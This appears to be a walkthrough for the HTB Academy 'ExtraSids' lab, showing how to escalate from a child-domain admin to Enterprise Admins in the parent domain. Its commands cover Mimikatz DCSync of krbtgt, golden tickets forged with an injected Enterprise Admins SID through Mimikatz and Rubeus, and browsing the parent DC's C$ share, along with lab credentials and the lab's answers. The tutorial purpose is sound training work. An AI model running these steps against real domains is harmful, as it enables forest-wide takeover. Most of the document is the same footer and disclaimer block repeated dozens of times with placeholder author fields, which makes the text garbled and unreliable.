# 🛰️ HTB Academy - ExtraSids Lab

## 🔍 Overview

The **ExtraSids** lab on HTB Academy involves exploiting trust relationships in Active Directory (AD) environments to escalate privileges from a child domain admin to the enterprise admins group in the parent domain. This guide provides step-by-step instructions and technical details for completing this lab.

---

## 🌐 Lab Environment Setup

1. **Connect to the target machine using RDP**:
   ```bash
   # RDP to target with child domain admin credentials
   xfreerdp /v:<target-ip> /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!'
   ```

2. **Install required tools**:
   - Download and extract necessary PowerShell scripts such as `PowerView`.
   - Use Mimikatz for Kerberos ticket manipulation.
   - Install Rubeus for generating Golden Tickets.

---

## 🔑 Methodology

### **Step 1: Child Domain Compromise**

#### **Gather Attack Data**
```powershell
# Get child domain SID using PowerView
Import-Module .\PowerView.ps1
Get-DomainSID

# Extract the Enterprise Admins group's SID in the parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

#### **Create Golden Ticket**
```powershell
# Mimikatz equivalent attack
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Verify ticket in memory
klist
```

#### **Rubeus Golden Ticket**
```powershell
# Rubeus equivalent attack
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

# Verify ticket in memory
klist
```

### **Step 2: Parent Domain Compromise**

```powershell
# Verify access to parent domain controller
ls \\academy-ea-dc01.inlanefreight.local\c$

# Perform DCSync against parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

---

## 🎯 HTB Academy Lab Solutions

### **Lab Environment Setup**
```bash
# RDP to target with child domain admin credentials
xfreerdp /v:<target-ip> /u:htb-student_adm /p:'HTB_@cademy_stdnt_admin!'
```

### **🔍 Question 1: "What is the SID of the child domain?"**

**Solution:**
```powershell
# Import PowerView and get child domain SID
cd C:\Tools\
Import-Module .\PowerView.ps1
Get-DomainSID

# Alternative: Extract from KRBTGT DCSync output
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Look for "Object Security ID" field
```

**🎯 Answer**: `S-1-5-21-2806153819-209893948-922872689`

### **🏛️ Question 2: "What is the SID of the Enterprise Admins group in the root domain?"**

**Solution:**
```powershell
# Cross-domain Enterprise Admins SID enumeration
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

# Alternative built-in method:
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

**🎯 Answer**: `S-1-5-21-3842939050-3880317879-2865463114-519`

### **🎫 Question 1: "Perform the ExtraSids attack to compromise the parent domain. Submit the contents of the flag.txt file located in the c:\ExtraSids folder."**

**Complete Attack Solution:**

**Step 1: Gather Attack Data**
```powershell
# Get KRBTGT hash
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Extract: 9d765b482771505cbe97411065964d5f

# Get child domain SID  
Get-DomainSID
# Result: S-1-5-21-2806153819-209893948-922872689

# Get Enterprise Admins SID
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
# Result: S-1-5-21-3842939050-3880317879-2865463114-519
```

**Step 2: Execute ExtraSids Attack**
```powershell
# Create Golden Ticket with Enterprise Admin privileges
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

# Verify ticket loaded
klist
```

**Step 3: Access Parent Domain and Retrieve Flag**
```powershell
# Access parent domain controller
ls \\academy-ea-dc01.inlanefreight.local\c$

# Navigate to flag location and retrieve contents
type \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids\flag.txt
```

**🎯 Answer**: `[Flag contents from c:\ExtraSids\flag.txt]`

---

## ⚠️ **Security Implications**

### **Attack Prerequisites**
- **Child domain compromise**: Domain Admin or equivalent privileges required
- **Forest boundary**: Attack works within same AD forest due to SID filtering absence
- **Trust relationship**: Parent-child trust must exist (automatic in forests)

### **Detection Considerations**
- **Golden Ticket indicators**: Long-lived tickets, unusual user accounts
- **Cross-domain access**: Monitor Enterprise Admin group usage
- **SID History modifications**: Audit SID History attribute changes
- **KRBTGT password rotation**: Regular rotation invalidates Golden Tickets

### **Mitigation Strategies**
- **Privileged access management**: Limit child domain admin privileges
- **Monitoring**: Enhanced logging for cross-domain authentication
- **Segmentation**: Consider forest boundary design for high-security environments
- **KRBTGT maintenance**: Regular password rotation and monitoring

---

## 🔑 **Key Takeaways**

### **Attack Flow Summary**
```
Child Domain Compromise → KRBTGT Hash + SIDs → Golden Ticket Creation → Parent Domain Access
    (Domain Admin)        (Attack Data)       (ExtraSids Attack)     (Enterprise Admin)
```

### **Critical Success Factors**
- **SID History exploitation**: Forest-level trust allows SID injection
- **Enterprise Admins SID**: Key to parent domain privilege escalation  
- **Golden Ticket creation**: Both Mimikatz and Rubeus provide capability
- **Cross-domain enumeration**: PowerView enables target identification

### **Professional Impact**
- **Forest compromise**: Child domain breach leads to complete forest control
- **Privilege escalation**: Standard user → Enterprise Admin escalation path
- **Persistence mechanism**: Golden Tickets provide long-term access
- **Assessment value**: Demonstrates trust relationship security implications

**⬆️ Child → Parent trust attacks represent one of the most powerful AD privilege escalation techniques - transforming limited child domain access into complete forest control through SID History exploitation.**

---

## 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus) 

---

This guide provides a comprehensive approach to completing the ExtraSids lab in HTB Academy, ensuring that all necessary steps and technical details are covered for successful completion. 🚀

--- 
**Note**: Always ensure you have proper authorization before performing any penetration testing activities on networks or systems. This guide is intended solely for educational purposes within the context of a controlled environment such as HTB Academy. 

---  
![HTB Logo](https://www.hackthebox.eu/assets/images/logo.png)  

---

For more information, visit [HackTheBox's official website](https://www.hackthebox.eu/). 🌐

---
## 📝 Legal Disclaimer
This content is provided for educational purposes only and should be used responsibly. Unauthorized use of this knowledge may violate laws or regulations. Users are solely responsible for ensuring they comply with all applicable laws and have appropriate permissions before engaging in any security activities.

---  
**Author**: [Your Name]  
**Date**: [Current Date]

---

# 🙏 Thank You
Thank you for using this guide! If you found it helpful, consider following me on [Twitter](https://twitter.com/username) or joining the HTB community to stay updated with more tips and tricks. Happy hacking! 🚀

---  
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)

---
**Author's GitHub Repository**: https://github.com/your-username/htb-labs  

---

# 🔒 End of Guide
If you have any questions or need further assistance, feel free to reach out. Happy learning! 🎓

--- 
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)  
**HackTheBox EU**

--- 

# 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

---

## 🔒 Disclaimer
This content is intended for educational purposes only. Unauthorized use may violate laws or regulations.

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 🚀 Happy Hacking!  
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)  

---

## 👋 Goodbye
Thank you for your time and effort. Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)

---
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

--- 
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)  

--- 

**End of Guide** 📘

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

## 🔒 End
Thank you for your interest and support! 🎉

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your time and effort. Stay safe, stay secure!

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

--- 

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

--- 

# 📚 References
1. [PowerView PowerShell Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
2. [Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki/)
3. [Rubeus GitHub Repository](https://github.com/GhostPack/Rubeus)

---

## 💡 Credits & Acknowledgments
Special thanks to the HTB community and contributors who helped create this guide.

--- 
**Legal Disclaimer**: Unauthorized use of this content may violate laws or regulations. Users are solely responsible for ensuring compliance with all applicable laws and obtaining necessary permissions before engaging in any security activities.

---

# 🚀 Happy Hacking!
![HackTheBox Logo](https://www.hackthebox.eu/assets/images/logo.png)

--- 
**Author's GitHub Repository**: https://github.com/your-username/htb-labs

---

## 👋 Goodbye
Stay safe, stay secure!

--- 
![GitHub Logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)  

---

# 🌐 Connect With Us
Follow us on Twitter: [Username]  
Join the HTB Community: https://www.hackthebox.eu/

---

## 🔒 End of Guide
Thank you for your interest and support! 🎉

--- 
**Author**: [Your Name]  
**Date**: [Current Date]

